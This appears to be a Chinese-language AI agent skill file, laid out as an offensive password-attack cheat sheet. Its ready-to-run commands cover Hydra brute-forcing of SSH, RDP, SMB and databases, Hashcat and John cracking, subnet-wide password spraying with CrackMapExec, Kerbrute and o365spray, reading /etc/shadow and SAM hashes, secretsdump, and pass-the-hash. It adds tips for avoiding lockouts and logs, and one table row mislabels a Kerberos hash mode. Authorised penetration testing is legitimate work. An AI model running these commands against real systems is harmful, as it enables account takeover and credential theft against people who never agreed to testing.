---
name: password-attacks
description: 密码攻击与凭证破解，覆盖Hydra多协议爆破→Hashcat密码破解→John the Ripper→彩虹表→字典生成→凭证喷洒全流程
---

# 密码攻击与凭证破解

## 1. Hydra 多协议爆破

```bash
# SSH
hydra -l root -P pass.txt ssh://target
hydra -L users.txt -P pass.txt ssh://target

# HTTP POST登录
hydra -l admin -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Login failed"

# FTP
hydra -L users.txt -P pass.txt ftp://target

# SMB
hydra -l Administrator -P pass.txt smb://target

# RDP
hydra -t 1 -V -f -l Administrator -P pass.txt rdp://target

# MySQL
hydra -l root -P pass.txt mysql://target

# MSSQL
hydra -l sa -P pass.txt mssql://target

# 常用参数
# -t 4: 并发线程 (SSH用4, HTTP可用32)
# -vV: 详细输出每次尝试
# -f: 找到第一个就停止
# -e ns: 尝试空密码(n)和用户名作密码(s)
```

## 2. Hashcat

### 2.1 模式速查

| 哈希类型 | 模式(-m) | 示例 |
|----------|----------|------|
| MD5 | 0 | hashcat -m 0 |
| SHA1 | 100 | hashcat -m 100 |
| SHA256 | 1400 | hashcat -m 1400 |
| NTLM | 1000 | hashcat -m 1000 |
| NetNTLMv1 | 5500 | hashcat -m 5500 |
| NetNTLMv2 | 5600 | hashcat -m 5600 |
| Kerberos TGT | 13100 | hashcat -m 13100 |
| Kerberos AS-REP | 18200 | hashcat -m 18200 |
| WPA/WPA2 | 22000 | hashcat -m 22000 |
| bcrypt | 3200 | hashcat -m 3200 |
| SHA512Crypt | 1800 | hashcat -m 1800 |
| Kerberos 5 etype 23 | 13100 | hashcat -m 13100 |

### 2.2 常用命令

```bash
# 字典攻击
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# 字典+规则
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r rules/best64.rule

# 掩码攻击 (8位小写+数字)
hashcat -m 1000 -a 3 hash.txt ?l?l?l?l?l?l?d?d

# 组合攻击
hashcat -m 0 -a 1 hash.txt words1.txt words2.txt

# 混合攻击 (字典+掩码)
hashcat -m 1000 -a 6 hash.txt rockyou.txt ?d?d?d

# 显示已破解
hashcat --show -m 1000 hash.txt

# 优化参数
hashcat -m 1000 -O -w 4 hash.txt rockyou.txt  # -O优化 -w 4最大性能
```

## 3. John the Ripper

```bash
# 自动检测格式
john hash.txt

# 指定格式
john --format=NT hash.txt
john --format=raw-md5 hash.txt
john --format=Raw-SHA256 hash.txt

# 列出支持的格式
john --list=formats

# 显示结果
john --show hash.txt

# 生成规则
john --wordlist=rockyou.txt --rules=Jumbo --format=NT hash.txt
```

## 4. 字典生成

```bash
# crunch (传统)
crunch 6 8 0123456789 -o num6-8.txt   # 6-8位纯数字

# cewl (从网站爬取生成)
cewl -d 3 -m 5 -w target_words.txt http://target.com

# hashcat自带
# 掩码集: ?l=小写 ?u=大写 ?d=数字 ?s=特殊 ?a=全部
hashcat --stdout -a 3 ?l?l?l?d?d?d?d > 3lower4digit.txt
```

## 5. 凭证喷洒 (Password Spraying)

```bash
# 内网常用 — 密码喷洒 (一个密码试所有用户, 避免锁定)
# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!'
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# Kerbrute (Kerberos 预认证, 不产生日志)
./kerbrute passwordspray -d DOMAIN users.txt 'Spring2024!'

# o365spray (Office365)
o365spray --spray -U users.txt -d domain.com -p 'Spring2024!'
```

## 6. Linux/Unix 密码

```bash
# /etc/shadow 格式: $id$salt$hash
# $1$=MD5 $5$=SHA256 $6$=SHA512 $y$=yescrypt

# 破解
hashcat -m 1800 shadow.txt rockyou.txt   # SHA512Crypt
john --format=sha512crypt shadow.txt

# unshadow — 合并passwd+shadow
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt
```

## 7. Windows 密码

```bash
# NTLM Hash 提取
secretsdump.py -sam sam.hive -system system.hive LOCAL

# 破解
hashcat -m 1000 ntlm.txt rockyou.txt

# 直接利用 (PTH, 无需破解)
psexec.py -hashes :<NTLM_HASH> DOMAIN/User@target
```

## 8. 爆破策略

```
需要爆破的服务:
├─ SSH (22) → hydra -t 4 -L users -P pass ssh://target
├─ HTTP POST → hydra http-post-form
├─ SMB (445) → crackmapexec smb
├─ RDP (3389) → hydra -t 1 rdp (慢, 小心锁定)
├─ FTP (21) → hydra ftp
├─ MySQL (3306) → hydra mysql
└─ MSSQL (1433) → hydra mssql

获取密码哈希:
├─ Windows → mimikatz / secretsdump
├─ Linux → /etc/shadow
├─ Web → 数据库哈希 (SELECT password FROM users)
└─ 网络 → Responder (LLMNR/NBT-NS/mDNS投毒)

破解哈希:
├─ 字典: rockyou.txt → hashcat -a 0
├─ 字典+规则: rockyou + best64.rule → hashcat -a 0 -r
├─ 掩码: ?l?l?l?l?d?d → hashcat -a 3
└─ 彩虹表 (NTLM only): ophcrack / rcracki_mt
```

---

*参考: Hashcat Wiki + CrackMapExec + 实战经验*
